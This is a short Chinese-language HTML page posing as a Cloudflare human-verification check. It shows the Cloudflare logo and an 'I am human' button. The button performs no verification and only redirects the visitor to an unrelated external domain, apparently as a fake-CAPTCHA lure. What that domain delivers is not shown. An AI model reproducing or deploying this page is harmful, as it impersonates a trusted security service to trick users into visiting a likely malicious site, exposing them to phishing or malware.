<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>人机验证页面</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .cloudflare-logo {
            width: 200px;
            height: auto;
            margin-bottom: 40px;
        }

        .verify-btn {
            padding: 12px 40px;
            font-size: 18px;
            color: #fff;
            background-color: #0066cc;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .verify-btn:hover {
            background-color: #0052a3;
        }
    </style>
</head>
<body>
    <img src="https://cdnjs.cloudflare.com/ajax/libs/cloudflare-icons/6.0.0/svg/logo-cloudflare.svg" alt="Cloudflare Logo" class="cloudflare-logo">
    <button class="verify-btn" onclick="window.location.href='http://x67.top/sd1/#1767456730605'">我是人类</button>
</body>
</html>
